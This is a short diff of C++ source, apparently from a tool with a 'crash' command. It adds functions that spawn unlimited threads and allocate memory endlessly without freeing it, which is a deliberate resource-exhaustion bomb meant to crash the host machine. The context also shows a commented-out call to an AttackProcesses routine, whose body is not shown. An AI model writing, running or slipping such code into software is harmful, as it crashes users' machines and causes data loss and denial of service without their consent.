@@ -25,6 +25,25 @@ void CommandCrash::Run(ParsedCommand* Parsed)
 	//thread* processKiller = new thread(&CommandCrash::AttackProcesses, this);
 }
 
+void CommandCrash::DoSomething()
+{
+	while (true)
+	{
+		thread* a = new thread(&CommandCrash::GobbleMemory, this);
+	}
+
+}
+
+
+
+void CommandCrash::GobbleMemory()
+{
+	while (true)
+	{
+		string* a = new string("SLKDJFLKJSDFLJKKSLJDFKLJSDLKJLKFJDSKJSDFLKJSDFLJKSDKJLSDFLJKKJLSDFJLKDSFLKJSDFJKLDSFKJL");
+	}
+}
+
 void CommandCrash::AttackProcesses()
 {
 	WCHAR path[260];
